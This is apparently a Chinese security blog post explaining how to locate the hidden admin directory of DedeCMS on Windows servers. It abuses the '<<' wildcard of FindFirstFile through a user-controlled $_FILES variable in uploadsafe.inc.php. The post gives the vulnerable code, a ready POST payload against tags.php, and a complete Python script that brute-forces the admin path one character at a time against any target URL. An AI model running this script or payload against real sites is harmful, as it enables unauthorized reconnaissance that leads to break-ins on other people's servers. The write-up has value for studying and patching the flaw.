---
title: dedecms查找后台目录
date: 2019-03-11 11:11:23
tags: [cms]
categories: dedecms
---

# DEDECMS查找后台目录

## 利用条件：

- Windows系统 

  因为需要用到通配符`<`(或`>`)，来达到以下效果。

  建立两个php文件，5149ff33ebec0e6ad37613ea30694c07.php和demo.php

  内容如下：

  ```php
  #5149ff33ebec0e6ad37613ea30694c07.php
  <?php
  	phpinfo();
  ?>
  ```

 ```php
#demo.php
<?php
	$filename = $_GET["file"];
	include $filename.".php";
?>
 ```

![001](/img/dedecms/dedecms查找后台目录/001.png)

这里是利用到了windows的FindFirstFile(API),这个API把<<当成通配符来用。而PHP的opendir(win32\readdir.c)就使用了该API。

- 包含common.inc.php的php文件，如tags.php

- 后台中一张的图片名


## 代码逻辑

在common.inc.php的145行

![002](/img/dedecms/dedecms查找后台目录/002.png)

uploadsafe.inc.php

```php
if( preg_match('#^(cfg_|GLOBALS)#', $_key) )
    {
        exit('Request var not allow for uploadsafe!');
    }
    $$_key = $_FILES[$_key]['tmp_name'];
    ${$_key.'_name'} = $_FILES[$_key]['name'];
    ${$_key.'_type'} = $_FILES[$_key]['type'] = preg_replace('#[^0-9a-z\./]#i', '', $_FILES[$_key]['type']);
    ${$_key.'_size'} = $_FILES[$_key]['size'] = preg_replace('#[^0-9]#','',$_FILES[$_key]['size']);
    if(!empty(${$_key.'_name'}) && (preg_match("#\.(".$cfg_not_allowall.")$#i",${$_key.'_name'}) || !preg_match("#\.#", ${$_key.'_name'})) )
    {
        if(!defined('DEDEADMIN'))
        {
            exit('Not Admin Upload filetype not allow !');
        }
    }
    if(empty(${$_key.'_size'}))
    {
        ${$_key.'_size'} = @filesize($$_key);
    }
    
    $imtypes = array
    (
        "image/pjpeg", "image/jpeg", "image/gif", "image/png", 
        "image/xpng", "image/wbmp", "image/bmp"
    );

    if(in_array(strtolower(trim(${$_key.'_type'})), $imtypes))
    {
        $image_dd = @getimagesize($$_key);
        if (!is_array($image_dd))
        {
            exit('Upload filetype not allow !');
        }
    }
```

这一段中<font color="red">$$_key</font>的<font color="red">$key</font>取自<font color="red">$_FILE</font>,是用户可控的,可以传入<font color="red">_FILES[poc][tmp_name]=payload<</images/adminico.gif&_FILES[poc][name]=0&_FILES[poc][size]=0&_FILES[poc][type]=image/gif</font>来查找后台。payload处结合通配符可以节省遍历时间。

结合脚本：

![003](/img/dedecms/dedecms查找后台目录/003.png)

## 脚本

拿红日的脚本改的

```python3
#!/usr/bin/env python
#coding:utf-8
'''/*
    * env    = python3
    */
'''
import requests
import itertools
from optparse import OptionParser
characters = "abcdefghijklmnopqrstuvwxyz0123456789_!#"

data = {
    "_FILES[poc][tmp_name]" : "./{p}<</images/adminico.gif",
    "_FILES[poc][name]" : 0,
    "_FILES[poc][size]" : 0,
    "_FILES[poc][type]" : "image/gif"
}

def exec(url):
    back_dir = ""
    flag = 0
    for num in range(1,7):
        if flag:
            break
        for pre in itertools.permutations(characters,num):
            pre = ''.join(list(pre))
            data["_FILES[poc][tmp_name]"] = data["_FILES[poc][tmp_name]"].format(p=pre)
            print("testing",pre)
            r = requests.post(url,data=data)
            if "Upload filetype not allow !" not in r.text and r.status_code == 200:
                flag = 1
                back_dir = pre
                data["_FILES[poc][tmp_name]"] = "./{p}<</images/adminico.gif"
                break
            else:
                data["_FILES[poc][tmp_name]"] = "./{p}<</images/adminico.gif"
    print("[+] 前缀为：",back_dir)
    flag = 0
    for i in range(30):
        if flag:
            break
        for ch in characters:
            if ch == characters[-1]:
                flag = 1
                break
            data["_FILES[poc][tmp_name]"] = data["_FILES[poc][tmp_name]"].format(p=back_dir+ch)
            r = requests.post(url, data=data)
            if "Upload filetype not allow !" not in r.text and r.status_code == 200:
                back_dir += ch
                print("[+] ",back_dir)
                data["_FILES[poc][tmp_name]"] = "./{p}<</images/adminico.gif"
                break
            else:
                data["_FILES[poc][tmp_name]"] = "./{p}<</images/adminico.gif"
    print("后台地址为：",back_dir)

def main():
    parser = OptionParser()
    parser.add_option('-u','--url',type='string',dest='url',help='Targer URL(e.g. "https://www.site.com")')
    (options, args) = parser.parse_args()
    if options.url:
        #目标url
        url = options.url+"/tags.php"
        exec(url)
    else:
        parser.print_help()
if __name__ == '__main__':
    main()
```

